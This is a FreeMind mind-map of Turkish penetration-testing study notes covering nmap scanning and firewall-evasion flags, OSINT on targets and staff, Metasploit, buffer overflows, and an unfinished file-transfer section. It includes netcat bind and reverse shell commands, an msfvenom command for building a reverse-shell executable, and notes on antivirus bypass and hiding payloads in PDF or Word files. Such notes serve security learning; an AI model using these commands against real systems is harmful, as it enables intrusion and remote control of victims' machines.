<map version="1.0.1">
<!-- To view this file, download free mind mapping software FreeMind from http://freemind.sourceforge.net -->
<node COLOR="#000000" CREATED="1439338899204" ID="ID_1453429835" MODIFIED="1511254655939">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      <img src="http://cdn.wccftech.com/wp-content/uploads/2015/12/white_hat1.png" width="60" height="45" />
      
    </p>
  </body>
</html>
</richcontent>
<edge COLOR="#000000" WIDTH="8"/>
<node COLOR="#0033ff" CREATED="1439339117630" HGAP="7" ID="ID_978357750" MODIFIED="1511254459802" POSITION="right" TEXT="A&#x15f;amalar" VSHIFT="57">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439339120276" HGAP="7" ID="ID_1288476150" MODIFIED="1440061106803" TEXT="Bilgi Toplama" VSHIFT="-65">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439339145335" HGAP="25" ID="ID_479387192" MODIFIED="1440061106804" TEXT="Aktif" VSHIFT="-47">
<edge COLOR="#990000" WIDTH="1"/>
<node COLOR="#111111" CREATED="1439339517183" ID="ID_1678159109" MODIFIED="1439341794516" TEXT="nmap tarama">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439341811209" ID="ID_1800443665" MODIFIED="1439407590560" TEXT="Ping tarama [-sP]">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342635023" ID="ID_968399254" MODIFIED="1439407590563" TEXT="ICMP echo request g&#xf6;nderir, ICMP ECHO REPLY gelirse host eri&#x15f;ilebilir.">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439342702243" ID="ID_1172542181" MODIFIED="1439407590567" TEXT="TCP Ping">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342705841" ID="ID_1569236223" MODIFIED="1439407590610" TEXT="default 80 veya ba&#x15f;ka porta SYN veya ACK g&#xf6;nderme.&#xa;E&#x11f;er RST veya SYN/ACK d&#xf6;nerse uzaktaki sistem &#xe7;evrim-i&#xe7;idir.&#xa;ICMP scan tipi -P0 p s&#x131;f&#x131;r ile yap&#x131;labilir.">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
</node>
<node COLOR="#111111" CREATED="1439342821985" ID="ID_1499413707" MODIFIED="1439407590625" TEXT="UDP tarama [-sU]">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342836828" ID="ID_326947807" MODIFIED="1439407590646" TEXT="nmap s&#x131;f&#x131;r byte&apos;l&#x131;k UDP paketler g&#xf6;nderir. ICMP port unreachable sonucu portun kapal&#x131; oldu&#x11f;unu g&#xf6;sterir.">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439341815203" ID="ID_1817353319" MODIFIED="1439407590658" TEXT="IP Protokol Tarama [-sO]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439342936117" ID="ID_305827971" MODIFIED="1439407590660" TEXT="Versiyon Bulma [-sV]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439342948216" ID="ID_1040238463" MODIFIED="1439407590666" TEXT="ACK Tarama [-sA]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341820276" ID="ID_1067402430" MODIFIED="1439407590669" TEXT="&#x130;&#x15f;letim Sistemi bulma">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439343191244" ID="ID_265261476" MODIFIED="1439407590679" TEXT="OS Fingerprinting (-O)">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343200834" ID="ID_1566290836" MODIFIED="1439407590681" TEXT="www.insecure.org/nmap/nmap-fingerprinting-article.html">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439342003288" HGAP="16" ID="ID_714637364" MODIFIED="1439407590684" TEXT="tcp.flags" VSHIFT="-25">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342012058" ID="ID_1176287212" MODIFIED="1439407590687" TEXT="{F:0x01,S:0x02, R:0x04, P:0x08, A: 0x10, U:0x20}">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439342120441" ID="ID_301152210" MODIFIED="1439407590735">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      <b>U</b>nskilled <b>A</b>ttackers <b>P</b>ester <b>R</b>eal <b>S</b>ecurity <b>F</b>olks
    </p>
    <ul>
      <li>
        Unskilled = URG
      </li>
      <li>
        Attackers = ACK
      </li>
      <li>
        Pester = PSH
      </li>
      <li>
        Real = RST
      </li>
      <li>
        Security = SYN
      </li>
      <li>
        Folks = FIN
      </li>
    </ul>
    <p>
      {U:32, A:16, P:8, R:4, S:2,&#xa0;F:1}
    </p>
  </body>
</html></richcontent>
<edge COLOR="#111111" WIDTH="thin"/>
<font NAME="SansSerif" SIZE="12"/>
</node>
<node COLOR="#111111" CREATED="1439342257562" ID="ID_1181145747" MODIFIED="1439407590738" TEXT="SYN (new connection requests)">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342359765" ID="ID_1944355928" MODIFIED="1439407590741" TEXT=" tcpdump &apos;tcp[13] &amp; 2 != 0&apos;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439342268797" ID="ID_625568169" MODIFIED="1439407590745" TEXT="RST (immediate session teardowns)">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342412997" ID="ID_1441797541" MODIFIED="1439407590749" TEXT=" tcpdump &apos;tcp[13] &amp; 4 != 0&apos;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439342425952" ID="ID_892343228" MODIFIED="1439407590754" TEXT="ACK (acknowledge)">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439342436777" ID="ID_175967700" MODIFIED="1439407590758" TEXT=" tcpdump &apos;tcp[13] &amp; 16 != 0&apos;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439342481477" ID="ID_1586724149" MODIFIED="1439407590761" TEXT="tcpdump - https://danielmiessler.com/study/tcpdump/">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439341953733" ID="ID_1078984891" MODIFIED="1439407590767" TEXT="TCP connect() Scan [-sT]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341966891" ID="ID_1314996701" MODIFIED="1439407590769" TEXT="SYN Stealth Scan [-sS]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341978582" ID="ID_777421381" MODIFIED="1439407590774" TEXT="FIN Scan [-sF]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341996570" ID="ID_327073335" MODIFIED="1439407590780" TEXT="Null Scan [-sN]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439342549919" ID="ID_1666223445" MODIFIED="1439407590785" TEXT="XMas Tree Scans [-sX]">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439342969721" ID="ID_1458504416" MODIFIED="1439407590790" TEXT="Zamanlama Ayarlar&#x131; ">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439343001942" ID="ID_1985103256" MODIFIED="1439407590795" TEXT="[-T0] paranoyak her paket aras&#x131; 5 dakika bekler">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343036541" ID="ID_1404152287" MODIFIED="1439407590799" TEXT="[-T1] sneaky">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343047273" ID="ID_694046956" MODIFIED="1439407590806" TEXT="[-T2] polite">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343053912" ID="ID_1052607894" MODIFIED="1439407590810" TEXT="[-T3] normal">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343062362" ID="ID_540394657" MODIFIED="1439407590813" TEXT="[-T4] Agresif">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343070380" ID="ID_1191265738" MODIFIED="1439407590819" TEXT="[-T5] Insane">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439343084733" ID="ID_1123030138" MODIFIED="1439407590874" TEXT="Decoys [-D]">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439343101804" ID="ID_173236218" MODIFIED="1439407590878" TEXT="IP Spoofing yap&#x131;labilir.">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439343115623" ID="ID_959183190" MODIFIED="1439407590881" TEXT="Fragmantasyon [-f]">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439343133024" ID="ID_1792100880" MODIFIED="1439407590884" TEXT="G&#xdc;venlik duvar&#x131;n&#x131;n kolayca bulamamas&#x131;n&#x131; sa&#x11f;lar taraman&#x131;n">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439343149262" ID="ID_1992393482" MODIFIED="1439407590887" TEXT="-sS, -sF, -sX veya -sN ile kullan&#x131;l&#x131;r">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439343239947" ID="ID_650257502" MODIFIED="1439407590890" TEXT="H&#x131;zl&#x131; tarama (-F)">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439490082761" ID="ID_1990824400" MODIFIED="1439490276127" TEXT="script ile tarama: nmap --script smb-check-vulns -p 445 &lt;IP&gt;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node CREATED="1440062344298" ID="ID_371911334" MODIFIED="1440062361575" TEXT="ips atlatmaj i&#xe7;in fragmente paket g&#xf6;nderilir"/>
</node>
<node COLOR="#111111" CREATED="1439339522907" ID="ID_532904887" MODIFIED="1439341794517" TEXT="whois">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339526184" ID="ID_1583802161" MODIFIED="1439341794518" TEXT="dns zone transfer">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439341768998" ID="ID_1838446884" MODIFIED="1439341794519" TEXT="# fierce -dns &lt;domain&gt; range">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439339533873" ID="ID_1898566724" MODIFIED="1439341794520" TEXT="mail listelerine mail g&#xf6;nderme">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341838040" ID="ID_87454894" MODIFIED="1439407590899" TEXT="Zaafiyet tarama ara&#xe7;lar&#x131;">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439341847274" ID="ID_1281582604" MODIFIED="1439407590903" TEXT="Nessus">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341849618" ID="ID_115709195" MODIFIED="1439407590906" TEXT="Openvas">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439341853304" ID="ID_1534172232" MODIFIED="1439407590910" TEXT="Linux sistemler i&#xe7;in ideal. Win zay&#x131;f">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439490117678" ID="ID_1047421740" MODIFIED="1439490276138" TEXT="openvas-setup">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439490127503" ID="ID_1967028414" MODIFIED="1439490276141" TEXT="openvas-start">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439341865419" ID="ID_1758716370" MODIFIED="1439407590912" TEXT="Nexpose">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
</node>
<node COLOR="#990000" CREATED="1439339149351" ID="ID_1031157172" MODIFIED="1440061106829" TEXT="Basit/Pasif">
<edge COLOR="#990000" WIDTH="1"/>
<node COLOR="#111111" CREATED="1439339542725" ID="ID_570418833" MODIFIED="1439341794521" TEXT="Google Dorks (Google Hacking DB)">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339566838" ID="ID_855547555" MODIFIED="1439341794522" TEXT="Shodan (comp. search engine) - http://shadon.io">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339588006" ID="ID_1827354146" MODIFIED="1439341794522" TEXT="Pipl, facebook, instagram, twitter, foursquare">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339607954" ID="ID_155567855" MODIFIED="1439341794523" TEXT="online port scan - http://centralops.net">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339617721" ID="ID_661994920" MODIFIED="1439341794524" TEXT="netcraft internet mining - netcraft.com">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339642664" ID="ID_1010357932" MODIFIED="1439341794524" TEXT="archive.org">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339763032" ID="ID_374336800" MODIFIED="1439341794525" TEXT="whois">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339845285" ID="ID_811456977" MODIFIED="1439341794526" TEXT="wireshark ile a&#x11f; izleme">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341710976" ID="ID_1784271738" MODIFIED="1439341794527" TEXT="Ki&#x15f;i arama">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439341714061" ID="ID_444904329" MODIFIED="1439341794527" TEXT="anywho (yurt d&#x131;&#x15f;&#x131;nda ge&#xe7;erli)">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341725491" ID="ID_1396677507" MODIFIED="1439341794528" TEXT="pipl">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339756224" ID="ID_473210707" MODIFIED="1439341794529" TEXT="the harvester - https://github.com/laramies/theHarvester">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341744654" ID="ID_209927448" MODIFIED="1439341794530" TEXT="maltego - kali&apos;de">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
</node>
<node COLOR="#990000" CREATED="1439339879025" HGAP="17" ID="ID_58363718" MODIFIED="1440061106835" TEXT="Hedefin" VSHIFT="29">
<edge COLOR="#990000" WIDTH="1"/>
<node COLOR="#111111" CREATED="1439339883876" ID="ID_1130053552" MODIFIED="1439341794531" TEXT="IP aral&#x131;klar&#x131;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339889350" ID="ID_1634930149" MODIFIED="1439341794532" TEXT="Sub domain&apos;leri">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339895608" ID="ID_1398226541" MODIFIED="1439341794533" TEXT="Dok&#xfc;manlar">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339900647" ID="ID_64202604" MODIFIED="1439341794533" TEXT="&#xc7;al&#x131;&#x15f;an servisleri">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339908529" ID="ID_1588798715" MODIFIED="1439341794534" TEXT="Servislerin sahip oldu&#x11f;u zaafiyetler">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439339922499" ID="ID_931436181" MODIFIED="1439341794535" TEXT="Kulland&#x131;&#x11f;&#x131; g&#xfc;venlik sistemleri">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341503404" ID="ID_383672385" MODIFIED="1439341794536" TEXT="Kablosuz a&#x11f;, kablolu a&#x11f;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341514381" ID="ID_1334331927" MODIFIED="1439341794536" TEXT="Adres ve tel bilgisi">
<edge COLOR="#111111" WIDTH="thin"/>
<node COLOR="#111111" CREATED="1439341657060" ID="ID_1576157087" MODIFIED="1439341794537" TEXT="http://numaradanisim.com">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node COLOR="#111111" CREATED="1439341515930" ID="ID_632235879" MODIFIED="1439341794538" TEXT="&#xc7;al&#x131;&#x15f;anlar&#x131;n mail adresi, tel ve sosyal medya profilleri">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341557112" ID="ID_1301769697" MODIFIED="1439341794539" TEXT="Alt y&#xfc;kleniciler">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341563925" ID="ID_1960755884" MODIFIED="1439341794540" TEXT="Parola kurallar&#x131;">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341568005" ID="ID_299438926" MODIFIED="1439341794541" TEXT="Verdi&#x11f;i hizmetler">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
<node COLOR="#111111" CREATED="1439341573713" ID="ID_1216017845" MODIFIED="1439341794541" TEXT="Web teknolojiler">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
</node>
<node COLOR="#00b439" CREATED="1439339126877" ID="ID_1673708904" MODIFIED="1440061106842" TEXT="Tarama">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439339159614" ID="ID_211467724" MODIFIED="1440061106843" TEXT="Port">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439339161380" ID="ID_1813728941" MODIFIED="1440061106844" TEXT="Zaafiyet">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1439339129027" ID="ID_253643407" MODIFIED="1440061106844" TEXT="Exploit">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439491585617" ID="ID_1933116276" MODIFIED="1440061106845" TEXT="MetaSploitFramework">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node CREATED="1440063713460" ID="ID_615314155" MODIFIED="1440063732147" TEXT="Veil-Evasion - Veil Framework"/>
</node>
<node COLOR="#00b439" CREATED="1439339131398" ID="ID_899558862" MODIFIED="1440061106846" TEXT="Post-exploit">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439339137727" ID="ID_166041651" MODIFIED="1440061106847" TEXT="&#x130;zleri temizleme">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node CREATED="1440061383793" ID="ID_219756234" MODIFIED="1440061386372" TEXT="Key Points">
<node CREATED="1440061387736" ID="ID_1193635020" MODIFIED="1440061388668" TEXT="A hacker will actively seek out information, not wait for others to give it to him"/>
<node CREATED="1440061394815" ID="ID_324187687" MODIFIED="1440061395620" TEXT="The difference between a script kiddie and a new hacker is the desire to learn"/>
<node CREATED="1440061401592" ID="ID_649352916" MODIFIED="1440061402136" TEXT="You need to experiment with a wide range of information security fields to find what interests you"/>
<node CREATED="1440061407544" ID="ID_623496192" MODIFIED="1440061419277" TEXT="It&#x2019;s not worth &#x201c;just seeing if you can&#x201d; do anything that isn&#x2019;t legal, the risk vs reward makes no sense for doing so"/>
<node CREATED="1440061427383" ID="ID_235925234" MODIFIED="1440061428283" TEXT="With courses, wargames, capture the flags and more importantly virtual machines there is no hacking scenario that can&#x2019;t be replicated legally"/>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439407579642" ID="ID_1672784190" MODIFIED="1440061106848" POSITION="left" TEXT="Assembly konular&#x131;">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439490266237" ID="ID_1923264474" MODIFIED="1440061106849" TEXT="http://asm.sourceforge.net/syscall.html">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439491475861" ID="ID_1080696986" MODIFIED="1440061106850" TEXT="&#xd6;nemli yazma&#xe7;lar">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439491481261" ID="ID_1339872512" MODIFIED="1440061106850" TEXT="ESP">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491483652" ID="ID_1546188200" MODIFIED="1440061106851" TEXT="EIP">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439407585348" ID="ID_280276049" MODIFIED="1440061106852" POSITION="left" TEXT="Buffer Overflow Ata&#x11f;&#x131;">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439490300309" ID="ID_1876388207" MODIFIED="1440061106857" TEXT="Program&#x131;n stack buffer&apos;&#x131;n&#x131; ta&#x15f;&#x131;r&#x131;p, ta&#x15f;t&#x131;ktan sonra &#xa;haf&#x131;za adresine istedi&#x11f;imiz kodu shellcode yapmaya denir.">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439490550666" ID="ID_1976089261" MODIFIED="1440061106860" TEXT="STACK dolduktan sonra EBP yazmac&#x131;na istedi&#x11f;imiz adresi girebiliriz.">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439490586437" ID="ID_164835800" MODIFIED="1440061106860" TEXT="Return oriented programming (ROP)">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439490385052" ID="ID_558606789" MODIFIED="1440061106861" POSITION="left" TEXT="Shell tipleri">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439490391647" ID="ID_1339777196" MODIFIED="1440061106862" TEXT="Bind shell">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439490469683" ID="ID_1901411697" MODIFIED="1440061106867" TEXT="Hacker&apos;in kurban bilgisayardaki a&#xe7;&#x131;k (LISTEN) &#xa;durumdaki porta do&#x11f;rudan ba&#x11f;lanmas&#x131;">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491035636" ID="ID_1700055314" MODIFIED="1440061106869" TEXT="Ayn&#x131; a&#x11f;da da olabilir, public a&#x11f;da da">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491082266" ID="ID_1190878285" MODIFIED="1440061106870" TEXT="1.Victim nc.exe -lvp 443 -e cmd.exe &#xe7;al&#x131;&#x15f;t&#x131;r&#x131;l&#x131;r">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491112002" ID="ID_149963099" MODIFIED="1440061106871" TEXT="2. nc.exe -vvn &lt;victim ip&gt;">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1439490396548" ID="ID_189405371" MODIFIED="1440061106872" TEXT="Reverse shell">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439491196118" ID="ID_534565902" MODIFIED="1440061106872" TEXT="Server: nc -lvp 443">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491204233" ID="ID_596900080" MODIFIED="1440061106873" TEXT="Client: nc.exe -vvn &lt;server&gt; 443 -e cmd.exe">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491234554" ID="ID_1765841782" MODIFIED="1440061106874" TEXT="Client, &quot;Al karde&#x15f; komuta senindir, buyur&quot; der.">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491265669" ID="ID_1311746758" MODIFIED="1440061106875" TEXT="ncat ssl&apos;li nv">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491272577" ID="ID_349834913" MODIFIED="1440061106876" TEXT="sbd secure backdoor. &#x15f;ifreli ncat">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1439491636624" ID="ID_400242255" MODIFIED="1440061106878" TEXT="Interactive">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439491640600" ID="ID_1373746755" MODIFIED="1440061106879" TEXT="Non-interactive">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439491653514" ID="ID_1382573101" MODIFIED="1440061106880" TEXT="tty &quot;not a tty&quot;">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439491306913" ID="ID_862761615" MODIFIED="1440061212429" POSITION="left" TEXT="E&#x11f;itim">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439491312200" ID="ID_631032003" MODIFIED="1440061106881" TEXT="securitytube.net">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1439491323512" ID="ID_1397448574" MODIFIED="1440061106882" TEXT="pentesteracademy.com">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node COLOR="#00b439" CREATED="1440056567221" ID="ID_694176239" MODIFIED="1440061106883" TEXT="cvedetails.com">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
<node CREATED="1440061222704" ID="ID_1581139152" LINK="https://www.ethicalhacker.net/" MODIFIED="1440061305844" TEXT="Certified Ethical Hacker forums"/>
<node CREATED="1440061245279" ID="ID_1535690274" LINK="http://www.offensive-security.com/information-security-training/penetration-testing-with-kali-linux/" MODIFIED="1440061258019" TEXT="Penetration Testing with Kali Linux"/>
<node CREATED="1440061267224" ID="ID_1349311932" LINK="http://www.securitytube-training.com/online-courses/securitytube-python-scripting-expert/index.html" MODIFIED="1440061278837" TEXT="Python for Pentesters and Hackers"/>
</node>
<node COLOR="#0033ff" CREATED="1439491708238" HGAP="27" ID="ID_329044582" MODIFIED="1440061106891" POSITION="left" TEXT="K&#xf6;t&#xfc;c&#xfc;l yaz&#x131;l&#x131;m haz&#x131;rlama" VSHIFT="57">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439491800730" ID="ID_949956428" MODIFIED="1440071717191" TEXT="msfvenom">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439491806930" ID="ID_1762588995" MODIFIED="1440061106897" TEXT="-p [payload] LHOST=&lt;KALI_DONUS_IP&gt; LPORT=&lt;KALI_DONUS_PORT&gt; &#xa;-b &quot;\x00\x0a\x0d\ff&quot; -exe -o &lt;EXE_PATH&gt;">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1439491934210" ID="ID_1807785280" MODIFIED="1440061106899" TEXT="payload = exploit module in msf">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1439491956765" ID="ID_51652764" MODIFIED="1440061106900" TEXT="windows/meterpreter/reverse_tcp">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439491976632" ID="ID_1298873463" MODIFIED="1440061106900" TEXT="single payload: windows/shell_bind_tcp">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439492063943" ID="ID_732230193" MODIFIED="1440061106901" TEXT="singles are standalone self contained">
<edge COLOR="#990000" WIDTH="1"/>
</node>
<node COLOR="#990000" CREATED="1439492003629" ID="ID_599415027" MODIFIED="1440061106902" TEXT="windows/shell/bind_tcp">
<edge COLOR="#990000" WIDTH="1"/>
<node COLOR="#111111" CREATED="1439492023752" ID="ID_1511762002" MODIFIED="1439492349068" TEXT="consists of stager (bind_tcp) and a stage (Shell)">
<edge COLOR="#111111" WIDTH="thin"/>
</node>
</node>
<node CREATED="1440063617948" ID="ID_850784513" MODIFIED="1440063636864" TEXT="encoder&apos;lar av&apos;leri atlatmak, payload&apos;u &#x15f;ifremelemek i&#xe7;in"/>
</node>
<node COLOR="#00b439" CREATED="1439492179671" ID="ID_1091015253" MODIFIED="1440061106903" TEXT="veil-evasion">
<edge COLOR="#00b439" WIDTH="2"/>
<node COLOR="#990000" CREATED="1440056377829" ID="ID_172288033" MODIFIED="1440061106904" TEXT="Bypass AV">
<edge COLOR="#990000" WIDTH="1"/>
</node>
</node>
<node COLOR="#00b439" CREATED="1439492189566" ID="ID_1052864856" MODIFIED="1440061106905" TEXT="pdf word i&#xe7;in gizleme">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
</node>
<node COLOR="#0033ff" CREATED="1439492089080" ID="ID_1224937079" MODIFIED="1440061106905" POSITION="left" TEXT="Dosya aktarma">
<edge COLOR="#0033ff" WIDTH="4"/>
<node COLOR="#00b439" CREATED="1439492092312" ID="ID_1671417002" MODIFIED="1440061106906" TEXT="ftp">
<edge COLOR="#00b439" WIDTH="2"/>
</node>
